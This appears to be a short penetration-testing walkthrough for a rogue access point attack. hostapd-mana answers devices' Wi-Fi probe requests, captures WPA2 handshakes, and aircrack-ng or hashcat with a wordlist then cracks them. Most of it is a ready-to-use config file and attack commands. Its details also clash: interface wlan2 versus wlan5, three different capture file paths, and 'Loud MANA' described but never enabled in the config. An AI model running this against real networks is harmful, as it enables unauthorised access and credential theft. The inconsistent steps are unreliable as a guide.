
**Concept:** Wireless client devices maintain a "Preferred Network List" (PNL) of networks they have previously connected to. When disconnected, they constantly broadcast **Probe Requests** looking for these networks (e.g., _"Is 'wifi-offices' here?"_).

**How it works:** **hostapd-mana** intercepts these probe requests. Using **Loud MANA** mode, it dynamically spins up an identical, rogue access point for _every single SSID_ the client asks for, pretending to be that network. When the device attempts to associate and authenticate against the rogue AP, it hands over its WPA2 handshake challenge/response data, allowing an auditor to capture the hash offline.


### Required Configuration File

Config file (`mana.conf`) — **watch the filename, not `mama.conf`**:


```
interface=wlan2
driver=nl80211
ssid=<target-ssid>
channel=<channel seen in probe traffic>
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=placeholder123
mana_wpaout=/home/user/handshake.hccapx
enable_mana=1
mana_macacl=0
```

Bring up the interface to allow `hostapd-mana` to hook into the underlying `nl80211` driver framework:

```
ip link set wlan5 up
```

#### Launch the Rogue Access Point

```
sudo hostapd-mana /tmp/mana.conf
```



### Extract and Verify Captured Hashes Offline

**Using Aircrack-ng:**

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/mana_handshake.hccapx
```

**Using Hashcat (Format Mode 22000):**

```
hashcat -m 22000 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```



